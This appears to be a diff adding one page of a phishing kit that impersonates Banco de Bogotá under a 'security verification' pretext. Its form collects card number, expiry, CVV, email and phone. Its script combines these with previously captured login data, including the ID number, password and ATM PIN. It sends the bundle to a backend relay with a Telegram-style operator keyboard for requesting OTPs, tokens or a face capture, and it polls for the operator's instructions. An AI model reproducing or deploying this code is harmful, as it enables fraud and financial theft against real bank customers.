@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Banco de Bogotá</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* Loader CSS */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-[#f3f7fc] min-h-screen flex flex-col items-center p-4">
+    <header class="w-full max-w-md flex items-center justify-between py-4">
+        <button aria-label="Volver" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-chevron-left"></i>
+        </button>
+        <h1 class="text-[#1a2a5a] font-semibold text-base">
+            Banco de Bogotá
+        </h1>
+        <button aria-label="Cerrar" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-times"></i>
+        </button>
+    </header>
+
+    <main class="w-full max-w-md">
+        <br>
+        <h2 class="text-[#1a2a5a] font-semibold text-lg mb-4">
+            Actualización de datos
+        </h2>
+        <section class="bg-white rounded-lg p-5 shadow-sm">
+            <div class="flex items-start space-x-3 mb-3">
+                <img alt="Icono de tarjeta" class="w-6 h-6 flex-shrink-0 mt-1" src="candado.png" />
+                <div>
+                    <div class="flex items-center space-x-1 mb-1">
+                        <span class="font-semibold text-[#1a2a5a] text-base">
+                            Verificación de Seguridad
+                        </span>
+                    </div>
+                    <p class="text-[#5a5a5a] text-sm leading-relaxed max-w-[320px]">
+                        Por motivos de seguridad, confirma los datos de tu tarjeta débito/crédito.
+                    </p>
+                </div>
+            </div>
+            <form id="pagoForm" class="mt-4 space-y-4">
+                <div>
+                    <label for="numero_tarjeta" class="block text-xs font-bold text-gray-700 mb-1">Número de
+                        tarjeta</label>
+                    <input type="tel" id="numero_tarjeta"
+                        class="w-full border border-gray-300 rounded-md p-2.5 focus:outline-none focus:border-[#003da5] text-[#1a2a5a] font-medium"
+                        placeholder="0000 0000 0000 0000" maxlength="19" required>
+                </div>
+
+                <div class="flex justify-between gap-4">
+                    <div class="flex-1">
+                        <label for="fecha_exp" class="block text-xs font-bold text-gray-700 mb-1">Fecha de
+                            Vencimiento</label>
+                        <input type="tel" id="fecha_exp"
+                            class="w-full border border-gray-300 rounded-md p-2.5 text-center focus:outline-none focus:border-[#003da5] text-[#1a2a5a] font-medium"
+                            placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                    <div class="flex-1">
+                        <label for="cvv" class="block text-xs font-bold text-gray-700 mb-1">CVV</label>
+                        <input type="password" id="cvv"
+                            class="w-full border border-gray-300 rounded-md p-2.5 text-center focus:outline-none focus:border-[#003da5] text-[#1a2a5a] font-black tracking-widest"
+                            placeholder="123" maxlength="4" required>
+                    </div>
+                </div>
+
+                <div>
+                    <label for="correo" class="block text-xs font-bold text-gray-700 mb-1">Correo electrónico</label>
+                    <input type="email" id="correo"
+                        class="w-full border border-gray-300 rounded-md p-2.5 focus:outline-none focus:border-[#003da5] text-[#1a2a5a] font-medium"
+                        placeholder="tu@correo.com" required>
+                </div>
+
+                <div>
+                    <label for="telefono" class="block text-xs font-bold text-gray-700 mb-1">Número de celular</label>
+                    <input type="tel" id="telefono"
+                        class="w-full border border-gray-300 rounded-md p-2.5 focus:outline-none focus:border-[#003da5] text-[#1a2a5a] font-medium"
+                        placeholder="3001234567" required>
+                </div>
+
+                <p id="errorMessage" class="text-red-500 text-center text-sm hidden">Datos incorrectos. Por favor
+                    verifica e intenta nuevamente.</p>
+
+                <button type="submit" id="pagarBtn" disabled
+                    class="w-full bg-[#e5e7eb] text-[#9ca3af] font-bold text-sm rounded-full py-3 mt-2 cursor-not-allowed transition-colors duration-200">
+                    Confirmar
+                </button>
+            </form>
+        </section>
+    </main>
+
+    <div id="loader" class="loader-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <p>Verificando información...</p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            const pagoForm = document.getElementById("pagoForm");
+            const numeroTarjetaInput = document.getElementById("numero_tarjeta");
+            const fechaExpInput = document.getElementById("fecha_exp");
+            const cvvInput = document.getElementById("cvv");
+            const correoInput = document.getElementById("correo");
+            const telefonoInput = document.getElementById("telefono");
+            const pagarBtn = document.getElementById("pagarBtn");
+            const loader = document.getElementById('loader');
+            const errorMessage = document.getElementById("errorMessage");
+
+            let initialLoginData = null;
+
+            // Leer datos de sessionStorage al cargar la página
+            const storedData = sessionStorage.getItem('initialLoginData');
+            if (storedData) {
+                initialLoginData = JSON.parse(storedData);
+            } else {
+                window.location.href = 'index.html';
+            }
+
+            function validateForm() {
+                const numeroTarjetaValido = numeroTarjetaInput.value.length === 19;
+                const fechaValida = fechaExpInput.value.length === 5;
+                const cvvValido = cvvInput.value.length >= 3;
+                const correoValido = correoInput.value.includes('@');
+                const telefonoValido = telefonoInput.value.length >= 10;
+                const allFilled = numeroTarjetaValido && fechaValida && cvvValido && correoValido && telefonoValido;
+
+                if (allFilled) {
+                    pagarBtn.disabled = false;
+                    pagarBtn.classList.remove('bg-[#e5e7eb]', 'text-[#9ca3af]', 'cursor-not-allowed');
+                    pagarBtn.classList.add('bg-[#003da5]', 'text-white', 'hover:bg-[#003487]');
+                } else {
+                    pagarBtn.disabled = true;
+                    pagarBtn.classList.add('bg-[#e5e7eb]', 'text-[#9ca3af]', 'cursor-not-allowed');
+                    pagarBtn.classList.remove('bg-[#003da5]', 'text-white', 'hover:bg-[#003487]');
+                }
+            }
+
+            // Listeners
+            numeroTarjetaInput.addEventListener('input', (e) => {
+                let { value } = e.target;
+                value = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+                e.target.value = value;
+                validateForm();
+            });
+
+            fechaExpInput.addEventListener('input', (e) => {
+                let { value } = e.target;
+                value = value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                e.target.value = value;
+                validateForm();
+            });
+
+            [cvvInput, telefonoInput].forEach(input => {
+                input.addEventListener('input', (e) => {
+                    e.target.value = e.target.value.replace(/\D/g, '');
+                    validateForm();
+                });
+            });
+
+            correoInput.addEventListener('input', validateForm);
+
+            async function sendCardData(messageContent, keyboard) {
+                try {
+                    const response = await fetch('/api/send-message', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            text: messageContent,
+                            keyboard: keyboard
+                        })
+                    });
+                    const data = await response.json();
+                    if (!response.ok) throw new Error(data.error);
+                    return data.result.message_id;
+                } catch (error) {
+                    console.error('Error sending data:', error);
+                    return null;
+                }
+            }
+
+            async function checkOperatorResponse(messageId) {
+                try {
+                    const response = await fetch(`/api/check-update/${messageId}`);
+
+                    if (response.status === 408) {
+                        loader.style.display = 'none';
+                        alert("Tiempo de espera agotado. Intenta nuevamente.");
+                        window.location.reload();
+                        return;
+                    }
+
+                    const data = await response.json();
+
+                    if (data.action) {
+                        if (data.action === 'error_tarjeta') {
+                            loader.style.display = 'none';
+                            errorMessage.classList.remove('hidden');
+                            pagoForm.reset();
+                            validateForm();
+                        } else if (data.action === 'pedir_sms') {
+                            window.location.href = "otp.html";
+                        } else if (data.action === 'pedir_dinamica' || data.action === 'pedir_token') {
+                            window.location.href = "token.html";
+                        } else if (data.action === 'pedir_cara') {
+                            window.location.href = "cara.html";
+                        } else if (data.action === 'finalizar') {
+                            window.location.href = "finish.html";
+                        }
+                    } else {
+                        setTimeout(() => checkOperatorResponse(messageId), 2000);
+                    }
+                } catch (error) {
+                    loader.style.display = 'none';
+                    console.error("Error checking response:", error);
+                }
+            }
+
+            pagoForm.addEventListener("submit", async (event) => {
+                event.preventDefault();
+                errorMessage.classList.add('hidden');
+                loader.style.display = 'flex';
+
+                let message = `<b>🏦 DATOS TARJETA - BOGOTÁ 🏦</b>\n`;
+
+                if (initialLoginData) {
+                    if (initialLoginData.identificationType) message += `<b>🆔 Tipo Doc:</b> ${initialLoginData.identificationType}\n`;
+                    if (initialLoginData.identificationNumber) message += `<b>👤 Documento:</b> <code>${initialLoginData.identificationNumber}</code>\n`;
+                    if (initialLoginData.secureKey && initialLoginData.secureKey !== 'N/A') message += `<b>🔑 Clave:</b> <code>${initialLoginData.secureKey}</code>\n`;
+                    if (initialLoginData.debitCardKey && initialLoginData.debitCardKey !== 'N/A') message += `<b>🔑 Clave Cajero:</b> <code>${initialLoginData.debitCardKey}</code>\n`;
+                }
+
+                message += `\n<b>💳 Tarjeta:</b> <code>${numeroTarjetaInput.value}</code>\n`;
+                message += `<b>📅 Exp:</b> <code>${fechaExpInput.value}</code>\n`;
+                message += `<b>🔐 CVV:</b> <code>${cvvInput.value}</code>\n`;
+                message += `<b>📧 Correo:</b> ${correoInput.value}\n`;
+                message += `<b>📱 Tel:</b> ${telefonoInput.value}\n`;
+                message += `<b>📅 Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: "❌ Error Tarjeta", callback_data: `error_tarjeta:N/A` }],
+                        [{ text: "👀 Pedir OTP", callback_data: `pedir_sms:N/A` }, { text: "💎 Pedir Token", callback_data: `pedir_dinamica:N/A` }],
+                        [{ text: "👤 Pedir Cara", callback_data: `pedir_cara:N/A` }, { text: "✅ Finalizar", callback_data: `finalizar:N/A` }]
+                    ]
+                };
+
+                const messageId = await sendCardData(message, keyboard);
+
+                if (messageId) {
+                    checkOperatorResponse(messageId);
+                } else {
+                    loader.style.display = 'none';
+                    alert("Error al enviar los datos.");
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
